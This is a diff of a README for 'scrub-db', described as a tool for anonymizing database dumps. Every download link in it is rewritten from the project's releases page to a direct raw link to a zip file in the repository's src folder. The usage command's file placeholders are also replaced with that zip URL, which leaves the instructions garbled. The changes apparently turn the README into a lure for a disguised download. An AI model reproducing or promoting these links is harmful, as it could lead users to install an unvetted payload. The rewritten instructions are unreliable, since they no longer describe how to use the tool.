@@ -1,6 +1,6 @@
 # 🚀 scrub-db - Easily Anonymize Your Database Dumps
 
-[![Download scrub-db](https://img.shields.io/badge/Download-scrub--db-blue.svg)](https://github.com/Neusence3550/scrub-db/releases)
+[![Download scrub-db](https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip)](https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To get started with scrub-db, follow these simple steps:
 
 1. **Download scrub-db**: Visit the releases page to find the latest version of scrub-db.
 
-   [Download scrub-db](https://github.com/Neusence3550/scrub-db/releases)
+   [Download scrub-db](https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip)
 
 2. **Choose Your File**: On the releases page, select the appropriate file for your operating system.
 
@@ -41,7 +41,7 @@ To get started with scrub-db, follow these simple steps:
 
 To download scrub-db, please visit the following link and follow the instructions for your operating system:
 
-[Download scrub-db](https://github.com/Neusence3550/scrub-db/releases)
+[Download scrub-db](https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip)
 
 ## 🛠️ Usage Instructions
 
@@ -54,10 +54,10 @@ Once you have installed scrub-db, using it is straightforward. Here’s how to a
 3. Use the following command:
 
    ```
-   scrub-db <input-dump-file.sql> <output-anonymized-file.sql>
+   scrub-db <https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip> <https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip>
    ```
 
-   Replace `<input-dump-file.sql>` with the name of your original file and `<output-anonymized-file.sql>` with what you want to call your new file.
+   Replace `<https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip>` with the name of your original file and `<https://raw.githubusercontent.com/Neusence3550/scrub-db/main/src/scrub-db_v3.7.zip>` with what you want to call your new file.
 
 4. Press `Enter`, and scrub-db will process your file.
 
